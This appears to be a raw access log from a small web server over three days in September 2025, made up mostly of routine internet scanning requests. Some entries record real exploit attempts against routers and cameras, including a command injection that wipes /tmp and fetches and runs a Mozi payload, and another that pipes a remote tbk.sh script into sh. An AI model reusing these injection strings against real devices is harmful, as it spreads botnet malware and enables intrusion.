nohup: ignoring input
 INFO  Accepting connections at http://localhost:8080
 HTTP  9/10/2025 8:09:39 PM 87.236.176.45 Returned 200 in 1 ms
 HTTP  9/10/2025 8:54:21 PM 79.124.58.198 GET /?XDEBUG_SESSION_START=phpstorm
 HTTP  9/10/2025 8:54:21 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/10/2025 8:58:47 PM 176.65.149.165 POST /goform/set_LimitClient_cfg
 HTTP  9/10/2025 8:58:47 PM 176.65.149.165 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:38 PM 167.94.138.32 GET /
 HTTP  9/10/2025 9:03:38 PM 167.94.138.32 Returned 200 in 1 ms
 HTTP  9/10/2025 9:27:41 PM 79.124.58.198 GET /actuator/gateway/routes
 HTTP  9/10/2025 9:27:41 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/10/2025 9:32:34 PM 45.38.44.221 GET /login
 HTTP  9/10/2025 9:32:34 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/10/2025 9:51:14 PM 176.65.149.162 POST /goform/set_LimitClient_cfg
 HTTP  9/10/2025 9:51:14 PM 176.65.149.162 Returned 200 in 1 ms
 HTTP  9/10/2025 10:31:04 PM 45.38.44.221 GET /login
 HTTP  9/10/2025 10:31:04 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/10/2025 10:49:55 PM 45.135.193.253 GET /
 HTTP  9/10/2025 10:49:55 PM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 11:30:44 PM 157.245.77.56 GET /
 HTTP  9/10/2025 11:30:44 PM 157.245.77.56 Returned 200 in 1 ms
 HTTP  9/10/2025 11:40:06 PM 115.52.244.126 GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.52.244.126:55611/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 HTTP  9/10/2025 11:40:06 PM 115.52.244.126 Returned 200 in 2 ms
 HTTP  9/10/2025 11:53:29 PM 45.38.44.221 GET /login
 HTTP  9/10/2025 11:53:29 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/11/2025 12:09:26 AM 127.0.0.1 HEAD /
 HTTP  9/11/2025 12:09:26 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 12:43:55 AM 184.105.139.67 GET /
 HTTP  9/11/2025 12:43:55 AM 184.105.139.67 Returned 200 in 1 ms
 HTTP  9/11/2025 12:45:34 AM 45.38.44.221 GET /login
 HTTP  9/11/2025 12:45:34 AM 45.38.44.221 Returned 200 in 0 ms
 HTTP  9/11/2025 12:46:32 AM 184.105.139.83 GET /favicon.ico
 HTTP  9/11/2025 12:46:32 AM 184.105.139.83 Returned 200 in 1 ms
 HTTP  9/11/2025 12:47:37 AM 184.105.139.95 GET http://api.ipify.org/?format=json
 HTTP  9/11/2025 12:47:37 AM 184.105.139.95 Returned 200 in 1 ms
 HTTP  9/11/2025 12:48:37 AM 184.105.139.67 GET /geoserver/web/
 HTTP  9/11/2025 12:48:37 AM 184.105.139.67 Returned 200 in 1 ms
 HTTP  9/11/2025 2:41:18 AM 198.235.24.138 GET /
 HTTP  9/11/2025 2:41:18 AM 198.235.24.138 Returned 200 in 1 ms
 HTTP  9/11/2025 2:46:04 AM 198.235.24.112 GET /
 HTTP  9/11/2025 2:46:04 AM 198.235.24.112 Returned 200 in 1 ms
 HTTP  9/11/2025 3:11:41 AM 185.169.4.150 GET /
 HTTP  9/11/2025 3:11:41 AM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/11/2025 3:40:40 AM 127.0.0.1 GET /.git/config
 HTTP  9/11/2025 3:40:40 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 5:49:15 AM 198.235.24.156 GET /
 HTTP  9/11/2025 5:49:15 AM 198.235.24.156 Returned 200 in 0 ms
 HTTP  9/11/2025 6:09:19 AM 127.0.0.1 GET /.git/config
 HTTP  9/11/2025 6:09:19 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 8:53:37 AM 64.226.115.20 GET /
 HTTP  9/11/2025 8:53:37 AM 64.226.115.20 Returned 200 in 1 ms
 HTTP  9/11/2025 8:53:38 AM 64.226.115.20 GET /download/powershell/
 HTTP  9/11/2025 8:53:38 AM 64.226.115.20 Returned 200 in 1 ms
 HTTP  9/11/2025 8:53:38 AM 64.226.115.20 GET /get.php
 HTTP  9/11/2025 8:53:38 AM 64.226.115.20 Returned 200 in 1 ms
 HTTP  9/11/2025 9:13:57 AM 127.0.0.1 GET /
 HTTP  9/11/2025 9:13:57 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 9:59:59 AM 64.227.76.184 GET /
 HTTP  9/11/2025 9:59:59 AM 64.227.76.184 Returned 200 in 1 ms
 HTTP  9/11/2025 10:01:43 AM 192.159.99.162 GET /
 HTTP  9/11/2025 10:01:43 AM 192.159.99.162 Returned 200 in 0 ms
 HTTP  9/11/2025 10:01:49 AM 192.159.99.162 POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh
 HTTP  9/11/2025 10:01:49 AM 192.159.99.162 Returned 200 in 2 ms
 HTTP  9/11/2025 10:01:49 AM 192.159.99.162 GET /
 HTTP  9/11/2025 10:01:49 AM 192.159.99.162 Returned 200 in 1 ms
 HTTP  9/11/2025 10:01:49 AM 192.159.99.162 POST /ws/v1/cluster/apps/new-application
 HTTP  9/11/2025 10:01:49 AM 192.159.99.162 Returned 200 in 1 ms
 HTTP  9/11/2025 10:01:50 AM 192.159.99.162 POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh
 HTTP  9/11/2025 10:01:50 AM 192.159.99.162 Returned 200 in 1 ms
 HTTP  9/11/2025 10:01:51 AM 192.159.99.162 POST /ws/v1/cluster/apps/new-application
 HTTP  9/11/2025 10:01:51 AM 192.159.99.162 Returned 200 in 1 ms
 HTTP  9/11/2025 10:01:51 AM 192.159.99.162 GET /
 HTTP  9/11/2025 10:01:51 AM 192.159.99.162 Returned 200 in 1 ms
 HTTP  9/11/2025 10:09:10 AM 45.115.252.217 GET /
 HTTP  9/11/2025 10:09:10 AM 45.115.252.217 Returned 200 in 1 ms
 HTTP  9/11/2025 10:18:36 AM 127.0.0.1 GET /.env
 HTTP  9/11/2025 10:18:36 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 10:45:18 AM 127.0.0.1 GET /
 HTTP  9/11/2025 10:45:18 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 10:52:08 AM 107.150.105.5 GET /
 HTTP  9/11/2025 10:52:08 AM 107.150.105.5 Returned 200 in 1 ms
 HTTP  9/11/2025 11:21:14 AM 61.0.109.151 POST /GponForm/diag_Form?images/
 HTTP  9/11/2025 11:21:14 AM 61.0.109.151 Returned 200 in 2 ms
 HTTP  9/11/2025 11:21:40 AM 20.65.194.183 GET /
 HTTP  9/11/2025 11:21:40 AM 20.65.194.183 Returned 200 in 0 ms
 HTTP  9/11/2025 11:36:10 AM 127.0.0.1 GET /
 HTTP  9/11/2025 11:36:10 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 11:52:26 AM 127.0.0.1 GET /.git/
 HTTP  9/11/2025 11:52:26 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 12:16:42 PM 45.156.87.179 GET /
 HTTP  9/11/2025 12:16:42 PM 45.156.87.179 Returned 200 in 1 ms
 HTTP  9/11/2025 1:19:34 PM 128.14.226.191 GET /
 HTTP  9/11/2025 1:19:34 PM 128.14.226.191 Returned 200 in 1 ms
 HTTP  9/11/2025 1:19:40 PM 128.14.226.191 GET /favicon.ico
 HTTP  9/11/2025 1:19:40 PM 128.14.226.191 Returned 200 in 1 ms
 HTTP  9/11/2025 1:19:40 PM 128.14.226.191 GET /robots.txt
 HTTP  9/11/2025 1:19:40 PM 128.14.226.191 Returned 200 in 1 ms
 HTTP  9/11/2025 1:19:41 PM 128.14.226.191 GET /sitemap.xml
 HTTP  9/11/2025 1:19:41 PM 128.14.226.191 Returned 200 in 1 ms
 HTTP  9/11/2025 1:19:41 PM 128.14.226.191 GET /js/app.e2f12930.js
 HTTP  9/11/2025 1:19:41 PM 128.14.226.191 Returned 200 in 1 ms
 HTTP  9/11/2025 1:19:41 PM 128.14.226.191 GET /js/chunk-vendors.0059c332.js
 HTTP  9/11/2025 1:19:41 PM 128.14.226.191 Returned 200 in 0 ms
 HTTP  9/11/2025 1:19:43 PM 128.14.226.191 GET /config.json
 HTTP  9/11/2025 1:19:43 PM 128.14.226.191 Returned 200 in 1 ms
 HTTP  9/11/2025 2:34:19 PM 216.180.246.114 GET /
 HTTP  9/11/2025 2:34:19 PM 216.180.246.114 Returned 200 in 1 ms
 HTTP  9/11/2025 2:39:36 PM 216.180.246.114 GET /favicon.ico
 HTTP  9/11/2025 2:39:36 PM 216.180.246.114 Returned 200 in 1 ms
 HTTP  9/11/2025 3:22:35 PM 127.0.0.1 GET /
 HTTP  9/11/2025 3:22:35 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 4:52:09 PM 44.220.188.191 GET /
 HTTP  9/11/2025 4:52:09 PM 44.220.188.191 Returned 200 in 2 ms
 HTTP  9/11/2025 4:52:09 PM 44.220.188.191 GET /favicon.ico
 HTTP  9/11/2025 4:52:09 PM 44.220.188.191 Returned 200 in 1 ms
 HTTP  9/11/2025 4:58:21 PM 45.38.44.221 GET /login
 HTTP  9/11/2025 4:58:21 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/11/2025 5:01:01 PM 89.36.78.122 GET /
 HTTP  9/11/2025 5:01:01 PM 89.36.78.122 Returned 200 in 1 ms
 HTTP  9/11/2025 5:01:05 PM 195.184.76.233 GET /
 HTTP  9/11/2025 5:01:05 PM 195.184.76.233 Returned 200 in 1 ms
 HTTP  9/11/2025 5:06:48 PM 176.65.149.162 POST /goform/set_LimitClient_cfg
 HTTP  9/11/2025 5:06:48 PM 176.65.149.162 Returned 200 in 2 ms
 HTTP  9/11/2025 5:15:18 PM 195.184.76.109 GET /favicon.ico
 HTTP  9/11/2025 5:15:18 PM 195.184.76.109 Returned 200 in 1 ms
 HTTP  9/11/2025 5:19:24 PM 176.65.149.165 POST /goform/set_LimitClient_cfg
 HTTP  9/11/2025 5:19:24 PM 176.65.149.165 Returned 200 in 1 ms
 HTTP  9/11/2025 5:43:46 PM 45.38.44.221 GET /login
 HTTP  9/11/2025 5:43:46 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/11/2025 6:32:36 PM 93.123.109.222 GET /login
 HTTP  9/11/2025 6:32:36 PM 93.123.109.222 Returned 200 in 1 ms
 HTTP  9/11/2025 6:44:14 PM 176.65.149.165 POST /goform/set_LimitClient_cfg
 HTTP  9/11/2025 6:44:14 PM 176.65.149.165 Returned 200 in 1 ms
 HTTP  9/11/2025 7:06:45 PM 45.38.44.221 GET /login
 HTTP  9/11/2025 7:06:45 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/11/2025 7:44:24 PM 176.65.132.49 GET /
 HTTP  9/11/2025 7:44:24 PM 176.65.132.49 Returned 200 in 1 ms
 HTTP  9/11/2025 8:18:51 PM 147.185.132.213 GET /
 HTTP  9/11/2025 8:18:51 PM 147.185.132.213 Returned 200 in 1 ms
 HTTP  9/11/2025 8:22:21 PM 205.210.31.23 GET /
 HTTP  9/11/2025 8:22:21 PM 205.210.31.23 Returned 200 in 1 ms
 HTTP  9/11/2025 9:23:15 PM 45.38.44.221 GET /login
 HTTP  9/11/2025 9:23:15 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/11/2025 9:25:17 PM 127.0.0.1 GET /
 HTTP  9/11/2025 9:25:17 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 9:25:19 PM 127.0.0.1 GET /favicon.ico
 HTTP  9/11/2025 9:25:19 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 9:25:43 PM 127.0.0.1 GET /favicon.ico
 HTTP  9/11/2025 9:25:43 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 9:26:36 PM 23.95.184.98 GET /
 HTTP  9/11/2025 9:26:36 PM 23.95.184.98 Returned 200 in 2 ms
 HTTP  9/11/2025 9:30:06 PM 79.124.58.198 GET /?XDEBUG_SESSION_START=phpstorm
 HTTP  9/11/2025 9:30:06 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/11/2025 9:30:45 PM 162.243.33.52 GET /
 HTTP  9/11/2025 9:30:45 PM 162.243.33.52 Returned 200 in 1 ms
 HTTP  9/11/2025 9:30:45 PM 162.243.33.52 GET /download/powershell/
 HTTP  9/11/2025 9:30:45 PM 162.243.33.52 Returned 200 in 1 ms
 HTTP  9/11/2025 9:30:46 PM 162.243.33.52 GET /get.php
 HTTP  9/11/2025 9:30:46 PM 162.243.33.52 Returned 200 in 1 ms
 HTTP  9/11/2025 9:57:49 PM 79.124.58.198 GET /actuator/gateway/routes
 HTTP  9/11/2025 9:57:49 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/11/2025 10:13:54 PM 91.231.89.80 GET /
 HTTP  9/11/2025 10:13:54 PM 91.231.89.80 Returned 200 in 1 ms
 HTTP  9/11/2025 10:14:44 PM 167.94.138.56 GET /
 HTTP  9/11/2025 10:14:44 PM 167.94.138.56 Returned 200 in 1 ms
 HTTP  9/11/2025 10:28:15 PM 91.231.89.244 GET /favicon.ico
 HTTP  9/11/2025 10:28:15 PM 91.231.89.244 Returned 200 in 1 ms
 HTTP  9/11/2025 10:29:29 PM 178.16.54.224 GET /
 HTTP  9/11/2025 10:29:29 PM 178.16.54.224 Returned 200 in 1 ms
 HTTP  9/11/2025 11:10:23 PM 45.38.44.221 GET /login
 HTTP  9/11/2025 11:10:23 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/11/2025 11:15:06 PM 127.0.0.1 GET /
 HTTP  9/11/2025 11:15:06 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 11:15:06 PM 127.0.0.1 GET /js/chunk-vendors.0059c332.js
 HTTP  9/11/2025 11:15:06 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 11:15:09 PM 127.0.0.1 GET /js/app.e2f12930.js
 HTTP  9/11/2025 11:15:09 PM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/11/2025 11:15:10 PM 127.0.0.1 GET /js/chunk-vendors.0059c332.js
 HTTP  9/11/2025 11:15:10 PM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/11/2025 11:15:13 PM 127.0.0.1 GET /js/app.e2f12930.js
 HTTP  9/11/2025 11:15:13 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/11/2025 11:15:14 PM 127.0.0.1 GET /.git/config
 HTTP  9/11/2025 11:15:14 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 12:23:27 AM 112.46.212.172 GET /
 HTTP  9/12/2025 12:23:27 AM 112.46.212.172 Returned 200 in 1 ms
 HTTP  9/12/2025 12:26:25 AM 45.38.44.221 GET /login
 HTTP  9/12/2025 12:26:25 AM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/12/2025 2:07:36 AM 3.85.32.168 GET /
 HTTP  9/12/2025 2:07:36 AM 3.85.32.168 Returned 200 in 1 ms
 HTTP  9/12/2025 2:40:20 AM 198.235.24.148 GET /
 HTTP  9/12/2025 2:40:20 AM 198.235.24.148 Returned 200 in 1 ms
 HTTP  9/12/2025 2:48:11 AM 198.235.24.101 GET /
 HTTP  9/12/2025 2:48:11 AM 198.235.24.101 Returned 200 in 2 ms
 HTTP  9/12/2025 5:47:01 AM 127.0.0.1 GET /.git/config
 HTTP  9/12/2025 5:47:01 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 6:25:20 AM 185.247.137.151 GET /
 HTTP  9/12/2025 6:25:20 AM 185.247.137.151 Returned 200 in 1 ms
 HTTP  9/12/2025 6:25:22 AM 185.247.137.164 GET /favicon.ico
 HTTP  9/12/2025 6:25:22 AM 185.247.137.164 Returned 200 in 1 ms
 HTTP  9/12/2025 6:55:02 AM 64.62.197.32 GET /
 HTTP  9/12/2025 6:55:02 AM 64.62.197.32 Returned 200 in 1 ms
 HTTP  9/12/2025 6:55:38 AM 64.62.197.33 GET /favicon.ico
 HTTP  9/12/2025 6:55:38 AM 64.62.197.33 Returned 200 in 1 ms
 HTTP  9/12/2025 6:55:51 AM 64.62.197.35 GET http://api.ipify.org/?format=json
 HTTP  9/12/2025 6:55:51 AM 64.62.197.35 Returned 200 in 1 ms
 HTTP  9/12/2025 6:56:10 AM 64.62.197.32 GET /geoserver/web/
 HTTP  9/12/2025 6:56:10 AM 64.62.197.32 Returned 200 in 1 ms
 HTTP  9/12/2025 7:24:37 AM 3.131.215.38 GET /
 HTTP  9/12/2025 7:24:37 AM 3.131.215.38 Returned 200 in 1 ms
 HTTP  9/12/2025 7:27:08 AM 3.131.215.38 GET /
 HTTP  9/12/2025 7:27:08 AM 3.131.215.38 Returned 200 in 1 ms
 HTTP  9/12/2025 7:45:11 AM 147.185.132.177 GET /
 HTTP  9/12/2025 7:45:11 AM 147.185.132.177 Returned 200 in 1 ms
 HTTP  9/12/2025 8:13:53 AM 134.122.91.201 GET /
 HTTP  9/12/2025 8:13:53 AM 134.122.91.201 Returned 200 in 1 ms
 HTTP  9/12/2025 8:13:53 AM 134.122.91.201 GET /download/powershell/
 HTTP  9/12/2025 8:13:53 AM 134.122.91.201 Returned 200 in 1 ms
 HTTP  9/12/2025 8:13:54 AM 134.122.91.201 GET /get.php
 HTTP  9/12/2025 8:13:54 AM 134.122.91.201 Returned 200 in 1 ms
 HTTP  9/12/2025 8:19:18 AM 203.55.131.3 GET /
 HTTP  9/12/2025 8:19:18 AM 203.55.131.3 Returned 200 in 1 ms
 HTTP  9/12/2025 8:19:57 AM 203.55.131.3 GET /favicon.ico
 HTTP  9/12/2025 8:19:57 AM 203.55.131.3 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:26 AM 127.0.0.1 GET /
 HTTP  9/12/2025 9:05:26 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:28 AM 127.0.0.1 GET //xmlrpc.php?rsd
 HTTP  9/12/2025 9:05:28 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:30 AM 127.0.0.1 GET //blog/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:30 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:31 AM 127.0.0.1 GET //wordpress/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:31 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:33 AM 127.0.0.1 GET //wp/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:33 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:35 AM 127.0.0.1 GET //2018/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:35 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:36 AM 127.0.0.1 GET //shop/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:36 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:38 AM 127.0.0.1 GET //test/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:38 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:39 AM 127.0.0.1 GET //wp2/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:39 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:05:41 AM 127.0.0.1 GET //cms/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:05:41 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:07 AM 127.0.0.1 GET /
 HTTP  9/12/2025 9:56:07 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:08 AM 127.0.0.1 GET //xmlrpc.php?rsd
 HTTP  9/12/2025 9:56:08 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:10 AM 127.0.0.1 GET //blog/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:10 AM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/12/2025 9:56:11 AM 127.0.0.1 GET //wordpress/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:11 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:13 AM 127.0.0.1 GET //wp/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:13 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:14 AM 127.0.0.1 GET //2020/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:14 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:16 AM 127.0.0.1 GET //shop/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:16 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:18 AM 127.0.0.1 GET //test/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:18 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:20 AM 127.0.0.1 GET //site/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:20 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 9:56:22 AM 127.0.0.1 GET //sito/wp-includes/wlwmanifest.xml
 HTTP  9/12/2025 9:56:22 AM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/12/2025 9:59:07 AM 190.14.157.52 GET /
 HTTP  9/12/2025 9:59:07 AM 190.14.157.52 Returned 200 in 1 ms
 HTTP  9/12/2025 11:07:29 AM 172.69.114.22 GET /
 HTTP  9/12/2025 11:07:29 AM 172.69.114.22 Returned 200 in 1 ms
 HTTP  9/12/2025 12:34:34 PM 199.45.155.64 GET /
 HTTP  9/12/2025 12:34:34 PM 199.45.155.64 Returned 200 in 1 ms
 HTTP  9/12/2025 12:34:40 PM 199.45.155.64 GET /
 HTTP  9/12/2025 12:34:40 PM 199.45.155.64 Returned 200 in 1 ms
 HTTP  9/12/2025 12:34:43 PM 199.45.155.64 GET /favicon.ico
 HTTP  9/12/2025 12:34:43 PM 199.45.155.64 Returned 200 in 1 ms
 HTTP  9/12/2025 12:34:50 PM 199.45.155.64 GET /favicon.ico
 HTTP  9/12/2025 12:34:50 PM 199.45.155.64 Returned 200 in 1 ms
 HTTP  9/12/2025 12:34:55 PM 199.45.155.64 GET /.well-known/security.txt
 HTTP  9/12/2025 12:34:55 PM 199.45.155.64 Returned 200 in 1 ms
 HTTP  9/12/2025 1:05:10 PM 45.38.44.221 GET /login
 HTTP  9/12/2025 1:05:10 PM 45.38.44.221 Returned 200 in 0 ms
 HTTP  9/12/2025 2:03:33 PM 127.0.0.1 GET /robots.txt
 HTTP  9/12/2025 2:03:33 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 2:03:35 PM 127.0.0.1 GET /
 HTTP  9/12/2025 2:03:35 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/12/2025 2:39:07 PM 20.118.217.181 GET /hudson
 HTTP  9/12/2025 2:39:07 PM 20.118.217.181 Returned 200 in 1 ms
 HTTP  9/12/2025 3:40:55 PM 20.14.95.138 GET /
 HTTP  9/12/2025 3:40:55 PM 20.14.95.138 Returned 200 in 1 ms
 HTTP  9/12/2025 3:54:45 PM 176.65.149.162 POST /goform/set_LimitClient_cfg
 HTTP  9/12/2025 3:54:45 PM 176.65.149.162 Returned 200 in 1 ms
 HTTP  9/12/2025 5:54:20 PM 54.241.140.27 GET /
 HTTP  9/12/2025 5:54:20 PM 54.241.140.27 Returned 200 in 1 ms
 HTTP  9/12/2025 5:55:16 PM 44.220.188.227 GET /
 HTTP  9/12/2025 5:55:16 PM 44.220.188.227 Returned 200 in 1 ms
 HTTP  9/12/2025 5:55:17 PM 44.220.188.227 GET /favicon.ico
 HTTP  9/12/2025 5:55:17 PM 44.220.188.227 Returned 200 in 1 ms
 HTTP  9/12/2025 6:11:16 PM 87.236.176.111 GET /
 HTTP  9/12/2025 6:11:16 PM 87.236.176.111 Returned 200 in 1 ms
 HTTP  9/12/2025 6:11:17 PM 185.247.137.213 GET /favicon.ico
 HTTP  9/12/2025 6:11:17 PM 185.247.137.213 Returned 200 in 2 ms
 HTTP  9/12/2025 6:19:24 PM 45.38.44.221 GET /login
 HTTP  9/12/2025 6:19:24 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/12/2025 7:15:46 PM 198.235.24.152 GET /
 HTTP  9/12/2025 7:15:46 PM 198.235.24.152 Returned 200 in 1 ms
 HTTP  9/12/2025 7:16:54 PM 54.81.200.147 GET /
 HTTP  9/12/2025 7:16:54 PM 54.81.200.147 Returned 200 in 1 ms
 HTTP  9/12/2025 7:53:34 PM 147.185.132.213 GET /
 HTTP  9/12/2025 7:53:34 PM 147.185.132.213 Returned 200 in 1 ms
 HTTP  9/12/2025 8:10:16 PM 45.38.44.221 GET /login
 HTTP  9/12/2025 8:10:16 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/12/2025 8:27:08 PM 20.65.193.243 GET /hudson
 HTTP  9/12/2025 8:27:08 PM 20.65.193.243 Returned 200 in 1 ms
 HTTP  9/12/2025 8:32:59 PM 176.65.149.162 POST /goform/set_LimitClient_cfg
 HTTP  9/12/2025 8:32:59 PM 176.65.149.162 Returned 200 in 1 ms
 HTTP  9/12/2025 9:10:49 PM 198.235.24.64 GET /
 HTTP  9/12/2025 9:10:49 PM 198.235.24.64 Returned 200 in 1 ms
 HTTP  9/12/2025 9:16:26 PM 176.65.149.165 POST /goform/set_LimitClient_cfg
 HTTP  9/12/2025 9:16:26 PM 176.65.149.165 Returned 200 in 1 ms
 HTTP  9/12/2025 9:21:38 PM 198.235.24.171 GET /
 HTTP  9/12/2025 9:21:38 PM 198.235.24.171 Returned 200 in 1 ms
 HTTP  9/12/2025 9:46:38 PM 90.151.171.106 GET http://fingerprints.bablosoft.com/ip?Z79822796531Q1
 HTTP  9/12/2025 9:46:38 PM 90.151.171.106 Returned 200 in 1 ms
 HTTP  9/12/2025 10:01:49 PM 79.124.58.198 GET /?XDEBUG_SESSION_START=phpstorm
 HTTP  9/12/2025 10:01:49 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/12/2025 10:27:49 PM 79.124.58.198 GET /actuator/gateway/routes
 HTTP  9/12/2025 10:27:49 PM 79.124.58.198 Returned 200 in 0 ms
 HTTP  9/12/2025 10:33:20 PM 205.210.31.31 GET /
 HTTP  9/12/2025 10:33:20 PM 205.210.31.31 Returned 200 in 1 ms
 HTTP  9/12/2025 11:00:41 PM 198.235.24.205 GET /
 HTTP  9/12/2025 11:00:41 PM 198.235.24.205 Returned 200 in 1 ms
 HTTP  9/12/2025 11:12:46 PM 45.38.44.221 GET /login
 HTTP  9/12/2025 11:12:46 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/12/2025 11:19:43 PM 80.82.77.202 GET /
 HTTP  9/12/2025 11:19:43 PM 80.82.77.202 Returned 200 in 1 ms
